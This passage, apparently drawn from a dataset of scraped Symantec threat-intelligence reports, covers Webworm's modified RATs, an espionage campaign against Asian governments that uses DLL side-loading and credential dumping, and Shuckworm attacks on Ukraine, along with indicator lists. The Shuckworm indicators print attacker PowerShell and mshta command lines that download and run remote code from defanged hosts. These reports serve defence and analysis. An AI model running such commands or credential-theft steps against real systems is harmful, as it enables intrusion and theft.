(e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90). The Trochilus modifications include functionality to load its configuration from a file by checking for any of the following locations (in order of preference): The content of the configuration file is decompressed using the Lempel–Ziv–Welch (LZW) algorithm. Interestingly, one of the locations described above (“C:\\ProgramData\\resmon.resmoncfg”) is mentioned in third-party research detailing previous Space Pirates (Webworm) activity. The malware then injects svchost.exe with the ability to: Further investigation by Symantec found that droppers that share a similar structure to the one used to deploy the version of Trochilus RAT modified by Webworm were also used to deploy two additional modified versions of Gh0st RAT and 9002 RAT. Some code modifications made to the variant of Trochilus RAT were also present in the two additional retooled RATs. The additional RATs included: Changes made by Webworm to this version of 9002 RAT are apparently intended to evade detection. For example, the details of the RAT’s communication protocol, such as encryption, have also been modified by the threat actors. Gh0st RAT (BH_A006) was documented in third-party research detailing previous Webworm (Space Pirates) activity. In that research, the version of Gh0st RAT included features such as layers of obfuscation to bypass security protections and hinder analysis, network service creation, UAC bypassing, and shellcode unpacking and launching in the memory. Some of these features were also present in the version of the RAT being prepared by Webworm. Webworm’s use of customized versions of older, and in some cases open-source, malware, as well as code overlaps with the group known as Space Pirates, suggest that they may be the same threat group. However, the common use of these types of tools and the exchange of tools between groups in this region can obscure the traces of distinct threat groups, which is likely one of the reasons why this approach is adopted, another being cost, as developing sophisticated malware can be expensive in terms of both money and time. For the latest protection updates, please visit theSymantec Protection Bulletin. c71e0979336615e67006e20b24baafb19d600db94f93e3bf64181478dfc056a8 - Trochilus dropper 28d78e52420906794e4059a603fa9f22d5d6e4479d91e9046a97318c83998679 – Logger.exe a6b9975bfe02432e80c7963147c4011a4f7cdb9baaee4ae8d27aaff7dff79c2b – logexts.dat a73a4c0aa557241a09e137387537e04ce582c989caa10a6644d4391f00a836ef – logexts.dll 10456bc3b5cfd2f1b1ab9c3833022ef52f5e9733d002ab237bdebad09b125024 – logger.dat d295712185de2e5f8811b0ce7384a04915abdf970ef0f087c294bb00e340afad – [RANDOM_DIGITS].doc e69177e58b65dd21e0bbe4f6caf66604f120e0c835f3ee0d16a45858f5fe9d90 – Trochilus RAT a618b3041935ec3ece269effba5569b610da212b1aa3968e5645f3e37d478536 - Backdoor configuration 6201c604ac7b6093dc8f6f12a92f40161508af1ddffa171946b876442a66927e – Trochilus dropper 3629d2ce400ce834b1d4b7764a662757a9dc95c1ef56411a7bf38fb5470efa84 - Backdoor configuration b9a0602661013d973bc978d64b7abb6bed20cf0498d0def3acb164f0d303b646 - Trochilus dropper 824100a64c64f711b481a6f0e25812332cc70a13c98357dd26fb556683f8a7c7 – Packed backdoor The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/webworm-espionage-rats"
  },
  {
    "title": "espionage asia governments",
    "content": "A distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal. The current campaign appears to be almost exclusively focused on government or public entities, including: A notable feature of these attacks is that the attackers leverage a wide range of legitimate software packages in order to load their malware payloads using a technique known as DLL side-loading. Usually, the attackers used multiple software packages in a single attack. In many cases, old and outdated versions of software are used, including security software, graphics software, and web browsers. In some cases, legitimate system files from the legacy operating system Windows XP are used. The reason for using outdated versions is that most current versions of the software used would have mitigation against side-loading built-in. DLL side-loading isa well-known techniquethat involves attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application themselves (having installed it themselves in most cases). The legitimate application then loads and executes the payload. Once a malicious DLL is loaded by the attackers, malicious code is executed, which in turn loads a .dat file. This file contains arbitrary shellcode that is used to execute a variety of payloads and associated commands in memory. In some cases, the arbitrary shellcode is encrypted. The attackers also leverage these legitimate software packages to deploy additional tools, which are used to further aid in lateral movement. These tools include credential dumping tools, a number of network scanning tools (NBTScan, TCPing, FastReverseProxy, and FScan), and the Ladon penetration testing framework. Attacks usually unfold in the following manner: In April 2022, the attackers targeted a government-owned organization in the education sector in Asia and managed to stay on its network until July. During the period of the compromise, the attackers accessed computers hosting databases and emails and eventually made their way to the domain controller. The first sign of malicious activity occurred on April 23, when a malicious command was executed via imjpuex.exe (SHA256: fb5bc4baece5c3ab3dabf84f8597bed3c3f2997336c85c84fdf4beba2dcb700f). The file imjputyc.exe is a legitimate Windows XP file that was used by the attackers to side-load a malicious DLL file (imjputyc.dll), which in turn was used to load a .dat file (payload - imjputyc.dat). Following this activity, imjputyc.exe was used to launch a network service via svchost.exe, likely created by the malicious payload. Additionally, around the same time, the attackers leveraged Imjpuex.exe to install and execute an eleven-year-old version of Bitdefender Crash Handler (file name: javac.exe, SHA256: 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd). While Crash Handler was used for side-loading in this attack, it is just one of many old versions of applications that have been used by this group in recent months. The same Crash Handler executable was copied to CSIDL_SYSTEM_DRIVE\\xampp\\tmp\\vmware.exe and executed. The attackers then installed and executed ProcDump in order to dump credentials from the Local Security Authority Server Service (LSASS): The attackers then launched several command prompts while reloading Crash Handler. This was likely done in order to install additional tools. Shortly afterwards, a file called calc.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9) appeared on the machine and was executed by the attackers. This was a renamed version of Mimikatz that the attackers then used to dump credentials: On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, apublicly available penetration testing frameworkthat is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest. On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability (CVE-2020-1472) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization’s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified). On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmdis a Microsoft command-line toolfor managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned. Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. •             SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda •             SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection. On May 19, the attackers returned to Computer #5 and used svchost to launch NetworkService. The attackers then used a variant of Mimikatz named calc.exe, which was previously used earlier in the attack (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). Mimikatz was used to dump credentials from the compromised host. On May 24, the attackers turned their attention to Computer #3, using PsExec to execute the whoami command and determine the currently logged-in user. They then ran an unknown batch file name t.bat via PsExec. It is likely the following commands were executed from this script in order to create a new user account: The script uses net.exe to check if a specific user account already exists. It then attempts to create a user account with the password Asd123.aaaa and add it to the local group on the machine. Several minutes later, the task manager was launched followed by a command prompt. The attackers then ran the following command to mount asnapshot of the active directory server. These snapshots contain sensitive information such as the active directory database (i.e. user credentials) and log files. The string c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb is the index number of the snapshot. The attackers then moved to Computer #5, where they used ProcDump (file name: p.exe, SHA256: 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424) to dump credentials from LSASS: On May 26, the attackers returned to Computer #1 and executed a file called go64.exe. This file was a copy of Fscan. The attackers ran the following command to mass scan for any machines within the compromised network (specifically a class C scan against machines in the IP range 10.72.0.0 → 10.72.0.255) with RDP services: There is also evidence that the attackers leveraged Fscan in order to perform exploit attempts against other machines on the network, including leveraging one of the ProxyLogon vulnerabilities (CVE-2021-26855) against an Exchange Server. Suspicious SMB activity also occurred around this time, suggesting the attackers may have also leveraged other exploits (likely EternalBlue) against any open SMB services. On June 6, the attackers ran PsExec on Computer #3 to launch the previously used old version of Crash Handler (file name: winnet.exe) from the %USERPROFILE%\\public\\ directory. They ran the Dnscmd utility again to enumerate all available zones, before executing winnet.exe again and a copy of Crash Handler located at APPDATA%\\t.exe to load additional malicious payloads (likely used to install ProcExplorer): Several hours later, ProcExplorer (64-bit) was launched: The last known malicious activity occurred on July 8 on Computer #3. The system hive file was dumped from the registry in order to dump user credentials. While this group of attackers was previously using ShadowPad, it has since moved on and has been deploying a range of payloads. One of the payloads used was a previously unseen, feature-rich information stealer (Infostealer.Logdatter), which appeared to be custom built. Its capabilities included: Other payloads used by the attackers included: ShadowPad is a modular RAT that was designed as a successor to the Korplug/PlugX Trojan and was, for a period of time, sold on underground forums. However, despite its origins as a publicly available tool, it has since been closely linked to espionage actors. The tool was only sold publicly for a very short period of time and it is believed that it was only sold to a handful of buyers. There is limited evidence to suggest links to past attacks involving the Korplug/PlugX malware and to attacks by a number of known groups, including Blackfly/Grayfly (APT41) and Mustang Panda. For example, the attackers leveraged a legitimate file called HPCustParticUI.exe, which was developed by HP for digital imaging applications. This previously occurred inattacks involving Korplug/Plug X. Furthermore, the attackers used a file called hpcustpartui.dll as a likely loader. The same loader was used ina long-running campaign involving Korplug/Plug X targeting the Roman Catholic Church. The current campaign uses a legitimate Bitdefender file to side-load shellcode. This same file and technique wereobserved in previous attacks linked to APT41. We have also observed the same keylogging tool deployed inprevious attacks against critical infrastructurein South East Asia. The use of legitimate applications to facilitate DLL side-loading appears to be a growing trend among espionage actors operating in the region. Although a well-known technique, it must be yielding some success for attackers given its current popularity. Organizations are encouraged to thoroughly audit software running on their networks and monitor for the presence of outliers, such as old, outdated software or packages that are not officially used by the organization. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. Legitimate applications abused for side-loading 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd – Bitdefender Crash Handler (2011) 1a95c0b8046aafa8f943bd6b68f3de550177f8df8c382f12468c4dcb416b12bc – log.dll 138c82c81ed7b84378a821074c88157c489d29d5ef66080baea88f5de0e865e6 – log.dll 704e6eb9bded6d22feab88fa81e6b0b901bee7a451a290c20527c48c235ebf52 – breakpad.dll 7a25b21df9fa93a694f15d18cd81c9f9be6fc078912924c91c645f75a5966881 – breakpad.dll 1d6aabf2114f9e6367b515d4ebfc6e104511ff4b05bd51a56fa52070c1d40e25 – breakpad.dll 5bedd1b05879b900b60a07abc57fab3075266ee7fa72385ced582699a51f1ec7 – breakpad.dll 49c23a187810edd3c16689ee1766445ec49a7221507dbe51e7b5af8ec46a91ee – breakpad.dll e51fc50defd89da446ddc0391e53ace60b016e497c5cb524fd81efdeadda056d – breakpad.dll 2237e15b094983a79f60bc1f7e962b7fb63aae75cbf5043ee636be4c8fdb9bee – Korplug b7f6cf8a6a697b254635eb0b567e2a897c7f0cefb0c0d4576326dc3f0eb09922 – Korplug 1c7e2d6ae46ff6c294885cb7936c905f328b303d6f790b66d7c4489f284c480a – QuasarRAT c3ae09887659cde70d636157c5a0efd36359efdfb2fe6a8e2cdd4e5b37528f51 – TrochilusRAT fa7eee6e322bfad1bb0487aa1275077d334f5681f0b4ede0ee784c0ec1567e01 – NBTScan d274190a347df510edf6b9a16987cea743d8df0e4c16af10787a31f0fec66da2 – NBTScan 20c767d32304ed2812ed8186dc14ddaaae581481c6dee26447a904fcaa67db2a – NBTScan cf5537af7dd1d0dbb77e327474aa58b2853cb1a1d4190991ac3d9ca40b7841aa – NBTScan df9a2471c23790a381e286bb96ea3401b94686b7ca067297a7920a76a7202112 – Loader 05fb86d34d4fa761926888e5347d96e984bbb1f3b693fe6c3ab77edb346f005b – FScan aba3e885768a6436b3c8bc208b328620f001c63db7a3efe6142e653cdf5dfbf7 – FScan 0f81c3850bc82a7d1927cf16bfad86c09414f8be319ef84b44a726103b7d029d – Powerview 9f04c46e0cdaa5bce32d98065e1e510a5f174e51b399d6408f2446444cccd5ff – TCPing 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133 – Ladon 23d0eff3c37390d38e6386a964c88ac2dafbace92090a762ae9e23bd49510f09 – WebPass 3e53deb5d2572c0f9fae10b870c8d4f5fdc7bd0fe1cc3b15ca91b31924373136 – WebPass 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424 – ProcDump 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 – Mimikatz 38d4456b38a2896f23cad615e3c9167e65434778074a9b24af3cbc14d1e323bf – cmd.exe (tampered copy of legitimate cmd.exe) 77358157efbf4572c2d7f17a1a264990843307f802d20bad4fb2442245d65f0b – ProcessExplorer 88.218.193.76 (used to host malware) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/espionage-asia-governments"
  },
  {
    "title": "russia ukraine shuckworm",
    "content": "UPDATE, 17.40 BST, August 15, 2022: Update for clarity re use of VCD, ASC, and H264 file extensions in file names. UPDATE, 17.50 BST, August 17, 2022:Additional IOCs added Recent Shuckworm activity observed by Symantec, a division ofBroadcom Software, and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted byCERT-UAon July 26. The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation. The first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system’s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file. These files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA’s July 26 publication about Shuckworm activity. This domain was also associated with an email that spoofed being from the Security Service of Ukraine and had “Intelligence Bulletin” in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email. The downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It’s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection. Two VBS downloaders that had the words “juice” and “justice” in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantecblogged about earlier this year. These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&C) server. Various suspicious files containing “ntuser” in the file names were also seen on victim machines. We associate these “ntuser” files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool. We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file namedntuser.dat.tmcontainer.vcdwas the parent process for a Giddome backdoor variant namedntuser.dat.tm.descendant.exethat was seen on victim machines. A suspicious file namedntuser.dat.tmcontainer.h264had a child process namedntuser.dat.tm.declare.exe, another malicious Giddome backdoor binary. Elsewhere, a file namedntuser.dat.tmcontainer.aschad a child process namedntuser.dat.tm.decay.exe. VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with thentuser.dat.tmcontainerprefix are files that represent the registry. It’s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion. The backdoor dropped on victim systems had the file name4896.exe. This backdoor had multiple capabilities, including: The legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks. This campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\\music), using files that contain \"ntuser.dat\" in the file name, using various artifacts that contain, for example, \"judgement\" in the file name, and also leveraging EXE files whose file names contain English words that begin with \"D\", “dat”, “decay”, “deer”, “declare”, etc. As the Russian invasion of Ukraine approaches the six-month mark, Shuckworm’s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. SHA256 filesabb6aab63b29610dbc0a6d634b6777ff0a2a2b61c5f60bd09b0c3aa3919fa00d63490fc0828f9683f5dd5799452d684dcc32db28d683943b2bad5b56eee6f03eb66cc523b88505cc2cc0568e97c9a80b1ceae448c8ac7d7b0d9c0f36378d8c2f26fcfbbfe4deeae3797bc7999c641f7a93e5a7eb378cf998069d88060801c47d1f8a4cf57052e66d4de953fcda3aca627308f93b6560934959d745ca6dda66d91aceb88288dd40535fdddcbdc1aa174109fe897122d693280d6ccec827f4df0bea4ba2c43bc3d18e5d01168ff4f864cbf727e3cb8b9cce5c3f75a27c91d63d849da410a62fb552a593b6da8ee89aa451efb6efcd1f3a35fab24e3c04fec84030420fccd78efe1e4739c3a694afada023e1ce425c29a0affa91bf02c16912d143e5f34a99d6799c4ff3a4b06e4f42ff136c1a0f59dd4629f3e4da3a7a93e7c88ed358e4b6afd14fd7b058e0deaeca0bf3537edc264ef7674c1c49db35b82b2d24f151d2b404315afe4951cbd870866e8fbb11d05d3752ad096bf00d68072d2262f1c65464f2a86cb6ad6c6792c7553d4162849b5a229fcc396c737edffdb1ee80c40aaaecb9331f1ddac9fe9b6d3455ecfd7b21b53159453f7fa3a82e3d5f9ecc2c7943730f3dfb89f534fcb137a4f6e53a7a697309e6cc247f0f9800f1460731b783b82e846bd8a623ca32982585cf8b79ce7cbf9988a041f7b2ac7fe5f8a7fe66d2b38589d08bbbe56b34b88bcefc702cdc6593c71e5ee446dbbb115336b876ac862717600c531846895f8884841d23e52c8332e708ca11c17a5c162ce43432b9c8ec91559a62baf87305e0ee387bb777da7830a6d9fc72c630e873858ec465d7d4077af0aff349821f0e964f42db5ab09eb8b2f427f266378aaa1d28af6c573f3667294731e3bdbf13d96d32a98342e225601f20157f774917d9147ce692a4597c517c81a53f7a32a67eb2b15e51a95b6bfdd4a33b11850b08eccf6e29d098184b5ff96d90a46ad33ba82faa2bb298282e7c35afc0ab96f884f668ad098e6120b1f6fec7a0f09c64e7e09de7952b7532f8c9cd4b45177d2125d84c6a40ec738cbae307b9efdb760cc97468ee7a363d5204559ab21e7982d63867cc13c6b09892953773c3b405f341df8e68bd8a23cbc9b8fd6c708082aab91632d6cb84bac28a5933f7248d1cf2dba19980efaf4f5d5b139563a22cec81df276661c014645022ddb97a23a9010b445b08a807b22a997174f528e87604be0bba4e0ccfa18050b26e8d55828dc8143b68ef6140eab7e5e7e59e6b9e104e032b28f5058a127d51efd099e4900b692a362cf29a12cd2a100a99b1dd29cfaac4b456808795c07b0f3fc80fcbf9e813d00af3f54714f79d7accd3888689ac6c5d02a750d804f4e5c330761d0a9b08c69cfdd135c69a537aef0df516b097cd9d6a0d9528bc907f4dddaa97a858124fb47ea2572a197bd762da9c19bac91bdd4c17469c2e48480e80883790ddd924b08942f3ecb6da5a32df090274b90829e651f984f287c00db0459202963acfa5622901de83cb75fad5bef35902d0ae42310d47f7433379dd3543e86461d0693801d8d523df9d2d0cd5a652d72c10acec8fab7344bb141c459543e18b1e48dfab33ed67f8ccd788904f2cd4be521ff152a477cec4baba52b56aec155f05ba566a66531b988c5a1dceee0b4a7bc2dc34ad2b68d984486e02891a4f6c3dc83f72a830c54980738467fb36e7b6b5da80e0d9657bd440dcad46ae9f96a2f895adfe7882bac956f31ec14fb52ea118138257d4a95fb9e1bb6f4e846d07b871fdd0edf4699051f5506f34f2663938faeca9400dae1c034ddb6b710d41c7d74b9023dbaadd588dad670c49e5a202ae695e12689618f926249d49a935c07315ef7eb27e19d11894b52148fbe8987b5726ef4390a56aa47a9a4bbe4b17dd0876 Host IOCsntuser.dat.tm.declare.exe / 2d0792d3f9d5a921a2d5b476feb88a345869d2f0d95f7342cc10ac1c838896cbjury.mp3 / 4a2b252eccab7da63aadb7a5539cc4ed8385d7bf258c325dea60ed0edc3e0e25joy.dat / b62bf1a504a474e259d78fc3349eed94982d6bf6af6012e23a1ec14b3d156dc9do594e.tmp / 09709be5f7cbb076166d004265a378504f05832ba461f59181b96b374c31a4b3cronos.exe / c3b7a1a739e3641147f4c10c5acfbc5816c12892b0edbe8038928f236f44ec84delve.prj / fd61dee37bafb3392fa4450d2afef18cf6b4b3fc5c87476de128c999e58cae593893.bmp.vbs / c0a317f60910eed08bbfc7b3ac6e6de1b2029bf4922d0b0d7d3759313a24b16c Network IOCsdestroy.asierdo[.]ruhxxp://destroy.asierdo[.]ru/45.63.94[.]49165.22.215[.]30149.28.99[.]18745.63.79[.]134140.82.58[.]157139.180.172[.]67141.164.45[.].23695.179.167[.]182140.82.47[.]97159.223.235[.]224138.68.254[.]91217.163.30[.]126144.202.54[.]111159.89.129[.]22207.246.80[.]1hxxp://159.223.235[.]224/crab/crevice.elga0698649.xsph[.]ruhxxp://a0698649.xsph[.]ru/preparations/band.xml157.245.99[.]132hxxp://157.245.99[.]132/get.php194.180.174[.]73hxxp://194.180.174[.]73/1.txt*.pasamart[.]ru155.138.252[.]221hxxp://155.138.252[.]221/get.php68.183.9[.]9hxxp://68.183.9[.]9/get.phpmotoristo.ru178.62.108[.]75hxxp://motoristo[.]ru/get.phpheato[.]ru140.82.54[.]136hxxp://heato[.]ru/index.phpleonardis[.]ru104.238[.]187.145141.8.192[.]82139.59.65[.]168hxxp://139.59.65[.]168/journal.au45.63.100[.]72hxxp://45.63.100[.]72/get.php?fr=3126424&se=3089412&dl=hxxps://meta[.]ua/uk/news/politics/52320-ukrayina-rozshirila-oboronnu-spivpratsyu-z-danieyu/&rm=hxxps://meta[.]ua/uk/&kf=false&ts=5875621&dw=2240&dh=1951&t=2053953&s=stable&eec=3242252&po=6485826&ju=8204688&kio=false&rqm=GET199.247.25[.]79hxxp://199.247.25[.]79/get.php Command linesCSIDL_PROFILE\\appdata\\local\\temp\\1645694127.exeCSIDL_PROFILE\\downloads\\anydesk (2).exeCSIDL_PROFILE\\ntuser.dat.tm.decay.exeCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c del /f /q CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '>>C:\\Users\\User\\29630.icoCSIDL_SYSTEM\\cmd.exe /c echo '>C:\\Users\\User\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c echo '17634.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmpCSIDL_SYSTEM\\cmd.exe /c echo '5491.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmpCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\29630.ico 29630.ico.txtCSIDL_SYSTEM\\cmd.exe /c rename CSIDL_PROFILE\\29630.ico.txt 29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\mshta.exe hxxp://a0698649.xsph[.]ru/preparations/band.xml /fCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hxxp://157.245.99[.]132/get.php')) | powershell -CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe -windowstyle hidden -nologo Invoke-Expression $env:IncludeCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hxxp://194.180.174[.]73/1.txt'); iex $aaa;CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.pasamart.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/lnk.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $IE1.document, $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\\index.txt'),$Doc); iex(iex $Doc)CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://155.138.252[.]221/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hxxp://68.183.9[.]9/get.php'); Invoke-Expression $tmpCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\29630.ico.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\17634.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\5491.bmp.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\appdata\\local\\temp\\ho2btvivw2m.vbsCSIDL_SYSTEM\\wscript.exe CSIDL_PROFILE\\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //bCSIDL_SYSTEMX86\\windowspowershell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfileCSIDL_SYSTEM\\cmd.exe /c CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.cmdCSIDL_SYSTEM\\cmd.exe /c start /min  powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - )CSIDL_WINDOWS\\explorer.exepowershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://motoristo[.]ru/get.php'))|powershell - )powershell -w hiddeN -c (iex echo (iex (new-object net.webclient).downloadstring('hxxp://sacramentos[.]ru/get.php'))|powershell - )wscript.exe CSIDL_PROFILE\\ntuser.dat.tmcontainer.asc //e:vbscript /deserve /decidedly /dene //bwscript.exe CSIDL_PROFILE\\documents\\jury.mp3 jenny //e:VBScript //b jokeCSIDL_PROFILE\\cronos.exeCSIDL_SYSTEM\\cmd.exe /c copy /y CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmpCSIDL_SYSTEM\\cmd.exe /c echo .> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbsCSIDL_SYSTEM\\cmd.exe /c echo '3893.bmp>> CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmpCSIDL_SYSTEM\\cmd.exe /c start /b CSIDL_PROFILE\\appdata\\local\\temp\\3893.bmp.vbs 